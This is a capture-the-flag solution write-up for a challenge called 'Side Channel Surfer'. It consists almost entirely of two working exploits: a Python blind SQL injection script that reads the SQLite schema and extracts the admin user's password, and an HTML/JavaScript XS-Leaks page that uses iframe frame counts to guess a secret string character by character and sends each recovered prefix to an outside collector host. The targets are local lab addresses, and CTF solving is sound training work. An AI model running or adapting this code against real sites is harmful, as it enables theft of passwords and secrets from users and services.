## Side Channel Surfer Solution
### Author: s1mple

# The sqli part

```py
#!/usr/bin/env python3

from requests import *
from urllib.parse import *
import json
target = "http://127.0.0.1:5000"
admin = 1000

schema = "passwd_"

r = Session()
for i in range(6):
    payload = f"(select(unicode(substr(sql,{137+i},1)))from[sqlite_master]limit(1))"
    res=r.get(f"{target}/search?id={quote(payload)}")
    try:
        schema += res.json()["message"]
    except:
        continue
# find the password column
schema=schema.strip()
print(schema)


password=""
# get the password
for i in range(1,400):
    payload =f"(select(unicode(substr([users].[{schema}],{i},1)))from[users]where[id]={admin})"
    res=r.get(f"{target}/search?id={(payload)}")
    try:
        password += res.json()["message"]
    except:
        continue
print(password)
```

# XS-Leaks part

```html
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>exploit</title>
</head>
<body>
    <script>
        function sleep(t){
            return new Promise(resolve => setTimeout(resolve, t));
        }
        const sear = 'http://127.0.0.1:5000/s3cret?search=';
        const collector = 'http://172.17.0.1:2323/leak';
        const ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_{}";
        function leak(query){
            return new Promise((resolve) => {
                const iframe = document.createElement("iframe");
                iframe.style.display = "none";

                const maxWaitMs = 3000;
                const pollMs = 40;
                const stableChecksNeeded = 3;

                const finish = (count) => {
                    iframe.remove();
                    resolve(count);
                };

                iframe.addEventListener("load", () => {
                    const start = Date.now();
                    let lastCount = -1;
                    let stableStreak = 0;

                    const poll = () => {
                        let count = 0;
                        try {
                            count = iframe.contentWindow.length;
                        } catch (e) {
                            console.log("frame count read failed:", e);
                            finish(0);
                            return;
                        }

                        if (count === lastCount) {
                            stableStreak++;
                        } else {
                            stableStreak = 0;
                            lastCount = count;
                        }

                        if (stableStreak >= stableChecksNeeded || Date.now() - start > maxWaitMs) {
                            finish(count);
                            return;
                        }

                        setTimeout(poll, pollMs);
                    };

                    poll();
                }, { once: true });

                iframe.src = sear + encodeURIComponent(query);
                document.body.appendChild(iframe);
            });
        }

        function report(prefix, done){
            fetch(`${collector}?prefix=${encodeURIComponent(prefix)}&done=${done}`, { mode: "no-cors" });
        }

        async function exploit(){
            const baseline = await leak("");
            console.log("baseline frame count (empty search):", baseline);
            if (baseline === 0) {
                console.log("baseline is 0");
                report("BASELINE_FAILED", true);
                return;
            }

            let prefix = "L";

            while (!prefix.endsWith("}")) {
                let found = false;
                for (const char of ALPHABET) {
                    const testPrefix = prefix + char;
                    console.log("testing:", testPrefix);
                    const frameCount = await leak(testPrefix);
                    if (frameCount > 0) {
                        prefix = testPrefix;
                        console.log("found character:", char, "new prefix:", prefix);
                        found = true;
                        report(prefix, false);
                        break;
                    }
                }
                if (!found) {
                    console.log("No more characters found, final prefix:", prefix);
                    break;
                }
            }

            console.log("FINAL:", prefix);
            report(prefix, true);
        }

        window.addEventListener("load", exploit);
    </script>
</body>
</html>
```
